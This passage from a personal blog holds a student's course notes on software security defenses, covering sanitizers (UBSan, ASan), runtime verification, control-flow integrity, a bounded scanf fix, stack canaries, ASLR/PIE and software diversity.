+<li>given a program P, generate a program P&rsquo; which is
+<ul>
+<li>equivalent to P in most ways</li>
+<li>behaves better than P with respect to some criteria</li>
+</ul>
+</li>
+</ul>
+<h3 id="concrete-semantics" >Concrete Semantics
+<span>
+    <a href="#concrete-semantics">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>all possible executions under all possible inputs</li>
+<li>could be close to infinite which is impractical to enumerate</li>
+<li>safety properties: no possible execution should reach these erroneous states</li>
+<li>testing: consdering a subset of the possible executions</li>
+<li>bounded model checking</li>
+<li>abstract interpretation: if the abstract semantics cover all possible cases -&gt; so does the concrete semantics
+<ul>
+<li>false alarms: widening of the model during execution</li>
+</ul>
+</li>
+</ul>
+<h2 id="defenses-against-common-vulnerabilities" >Defenses against Common Vulnerabilities
+<span>
+    <a href="#defenses-against-common-vulnerabilities">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><ul>
+<li>Runtime sanity checking</li>
+<li>Defensive programming; anticipate what might go wrong in software
+<ul>
+<li>Normal paradigm: expect others to follow the rules</li>
+<li>Defensive paradigm: expect others to ignore / by-pass the rules</li>
+</ul>
+</li>
+</ul>
+<h3 id="paranoia" >Paranoia
+<span>
+    <a href="#paranoia">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>NULL-check for every pointer access even when its an internal function called by a public function that does the check</li>
+<li>Undefined behavior sanitizer (UBSan)
+<ul>
+<li>stateless sanity checks</li>
+<li><code>-fsanitize=bool</code>
+<ul>
+<li>loading of a bool value which is neither true nor false</li>
+</ul>
+</li>
+<li><code>-fsanitize=bounds</code>
+<ul>
+<li>statically known checking</li>
+</ul>
+</li>
+<li><code>-fsanitize=function</code>
+<ul>
+<li>wrong type of pointer when calling</li>
+</ul>
+</li>
+<li><code>-fsanitize=null</code></li>
+<li><code>-fsanitize=integer-divide-by-zero</code></li>
+<li><code>-fsanitize=integer-overflow</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="dynamic-checking" >Dynamic Checking
+<span>
+    <a href="#dynamic-checking">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Fat pointer</li>
+</ul>
+<h3 id="addresssanitizer-asan" >AddressSanitizer (ASan)
+<span>
+    <a href="#addresssanitizer-asan">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Overhead of ASan is 70% on average</li>
+<li>Shadow memory</li>
+<li>Fast shadow translation</li>
+<li>Memory available gets mapped to shadow</li>
+<li>Shadow gets mapped to inaccessible</li>
+<li>Compact representation (7 bytes of membery into 1 byte of shadow memory)</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#999;font-style:italic">// before:
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>*addr = ...; or ... = *addr;
+</span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic">// after:
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span><span style="color:#6ab825;font-weight:bold">if</span> (*<span style="color:#447fcf">MemToShadow</span>(address) != <span style="color:#3677a9">0</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#447fcf">ReportError</span>(address, ...);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>*address = ...; <span style="color:#999;font-style:italic">// or: ... = *address;
+</span></span></span></code></pre></div><ul>
+<li>limitations:
+<ul>
+<li>continuous overrun detection only</li>
+<li>limited protection on use-after-free</li>
+<li>incompataible with other security scheme (e.g. UBSan)</li>
+<li>not suitable for library developers
+<ul>
+<li>not possible to use an application that is not using ASan with a library compiled with ASan</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="why-is-java-efficient" >Why is Java Efficient?
+<span>
+    <a href="#why-is-java-efficient">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>no 70% overhead but you still get an array index out of bounds exception</li>
+<li>Java Virutal Machine means the JVM can store extra metadata like length without depending on OS memeory implementation</li>
+<li>Java does not allow <strong>arbitrary casting</strong>
+<ul>
+<li>Only upward cast and sometimes downward cast. No re-interpret cast so length is always there. New object needs to be created for &ldquo;re-interpreting&rdquo;</li>
+</ul>
+</li>
+</ul>
+<h3 id="reference-monitor" >Reference Monitor
+<span>
+    <a href="#reference-monitor">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><h3 id="runtime-verification-rv" >Runtime Verification (RV)
+<span>
+    <a href="#runtime-verification-rv">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Validation: are we building the right product?</li>
+<li>Verification: are we building the product right?</li>
+<li>linear temporal logic (LTL): primitive properties, propositional connectives, temporal connectives</li>
+</ul>
+<h3 id="control-flow-integrity-cfi" >Control-Flow Integrity (CFI)
+<span>
+    <a href="#control-flow-integrity-cfi">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Shadow Stack: return address protection  inside Intel</li>
+</ul>
+<h3 id="aspect-oriented-programming" >Aspect Oriented Programming
+<span>
+    <a href="#aspect-oriented-programming">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>separation of cross-cutting concerns</li>
+<li>logging</li>
+<li>obscures control flow</li>
+</ul>
+<h2 id="entropy" >Entropy
+<span>
+    <a href="#entropy">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><h3 id="program-analysis" >program analysis
+<span>
+    <a href="#program-analysis">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>- <span style="color:#447fcf">scanf</span>(<span style="color:#ed9d13">&#34;%s&#34;</span>, buf);
+</span></span><span style="display:flex;"><span>+ <span style="color:#447fcf">scanf</span>(<span style="color:#ed9d13">&#34;%15s&#34;</span>, buf);
+</span></span></code></pre></div><h3 id="exploit-mitigation" >Exploit mitigation
+<span>
+    <a href="#exploit-mitigation">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><p>Add canary</p>
+<h3 id="randomizing-memory-addresses" >Randomizing Memory Addresses
+<span>
+    <a href="#randomizing-memory-addresses">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>ASLR — Address Space Layout Randomization
+<ul>
+<li>a system-level protection that randomly arranges the address space positions of key data areas of a process, including the base of the executable and the positions of the stack, heap and libraries.</li>
+</ul>
+</li>
+<li>PIE — Position Independent Executable
+<ul>
+<li>a body of machine code that executes properly regardless of its absolute address. This is also known as position-independent code (PIC)</li>
+</ul>
+</li>
+</ul>
+<h3 id="entropies-in-heap-allocators" >Entropies in Heap Allocators
+<span>
+    <a href="#entropies-in-heap-allocators">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><p>Allocate in random placements with canry boundaries</p>
+<h3 id="software-diversity" >Software Diversity
+<span>
+    <a href="#software-diversity">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>different compilers</li>
+<li>different languages</li>
+<li>different sanitization techniques</li>
+<li>different application (nginx vs apache)</li>
+<li>different libc implementation</li>
+</ul>
+
+        </div>
+        <div class="post-info">
+    
+        <div class="post-date dt-published">
+            <a class="u-url" href="/posts/university/cs-489-security/"><time datetime="2024-01-09">January 9, 2024</time></a>
+            
+        </div>
+    
+    <a class="post-hidden-url u-url" href="https://blog.elijahlopez.ca/posts/university/cs-489-security/">https://blog.elijahlopez.ca/posts/university/cs-489-security/</a>
+    <a href="https://blog.elijahlopez.ca/" class="p-name p-author post-hidden-author h-card" rel="me">Elijah Lopez</a>
+    <div class="post-taxonomies">
+        
+        
+            <ul class="post-tags">
+                
+                    
+                    <li><a href="https://blog.elijahlopez.ca/tags/university/">#University</a></li>
+                
+                    
+                    <li><a href="https://blog.elijahlopez.ca/tags/cybersecurity/">#Cybersecurity</a></li>
+                
+                    
+                    <li><a href="https://blog.elijahlopez.ca/tags/computer-science/">#Computer-Science</a></li>
+                
+            </ul>
+        
+        
+    </div>
+</div>
+
+    </article>
+
+    
+
+    
+        
+    
+    
+    <div class="pagination post-pagination">
+        <div class="left pagination-item ">
+            
+                <a title="BU 423 Options, Futures &amp; Swaps" href="/posts/university/bu-423-options-futures-swaps/">BU 423 Options, Futures &amp; Swaps</a>
+            
+        </div>
+        <div class="right pagination-item ">
+            
+                <a title="BU 397 Intermediate Financial Accounting II" href="/posts/university/bu-397-intermediate-financial-accounting-ii/">BU 397 Intermediate Financial Accounting II</a>
+            
+        </div>
+    </div>
+
+
+
+
+    
+
+    
+        <br>
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+<script src="https://giscus.app/client.js"
+        data-repo="elibroftw/blog.elijahlopez.ca"
+        data-repo-id="R_kgDOGiL7hg"
+        data-category="General"
+        data-category-id="DIC_kwDOGiL7hs4Cer6e"
+        data-mapping="og:title"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="preferred_color_scheme"
+        data-lang="en"
+        crossorigin="anonymous"
+        
+        async>
+</script>
+
+    
+
+        </main>
+        
+            <footer class="common-footer">
+    
+    
+
+    <div class="common-footer-bottom">
+        
+        <div class="copyright">
+            <p>© Elijah Lopez, 2024<br>
+            Powered by <a target="_blank" rel="noopener noreferrer" href="https://gohugo.io/">Hugo</a>, theme <a target="_blank" rel="noopener noreferrer" href="https://github.com/elibroftw/hugo-theme-anubis">Anubis</a>.<br>
+            
+            </p>
+        </div>
+    </div>
+
+    <p class="h-card vcard">
+
+    <a href=https://blog.elijahlopez.ca/ class="p-name u-url url fn" rel="me">Elijah Lopez</a> 
+
+     
+        /
+        <a class="p-email u-email email" rel="me" href="mailto:elijahllopezz@gmail.com">elijahllopezz@gmail.com</a>
+    
+
+     
+        <img class="u-photo" src="https://pbs.twimg.com/profile_images/1738729591064166400/vqarzcF7_400x400.jpg" />
+    
+</p> 
+</footer>
+
+        
+    </div>
+</body>
+</html>
